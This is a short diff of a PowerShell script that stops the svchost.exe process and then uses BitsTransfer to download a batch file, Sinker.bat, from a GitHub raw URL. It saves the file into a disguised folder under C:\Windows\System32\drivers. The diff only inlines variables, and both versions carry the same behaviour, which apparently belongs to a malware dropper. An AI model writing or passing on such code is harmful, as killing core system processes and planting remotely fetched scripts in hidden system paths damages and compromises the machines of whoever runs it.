@@ -1,12 +1,9 @@
-$ProcessName = svchost.exe
-$Sinker = Sinker.bat
-
-Stop-Process -processname $ProcessName
+Stop-Process -processname svchost.exe
 
 
 # Download Instructions
-$url2 = "https://raw.githubusercontent.com/diggles9991/RunMG/master/$Sinker"
-$output2 = "C:\Windows\System32\drivers\en-US\etc\$Sinker"
+$url2 = "https://raw.githubusercontent.com/diggles9991/RunMG/master/Sinker.bat"
+$output2 = "C:\Windows\System32\drivers\en-US\etc\Sinker.bat"
 Import-Module BitsTransfer
 Start-BitsTransfer -Source $url2 -Destination $output2
 
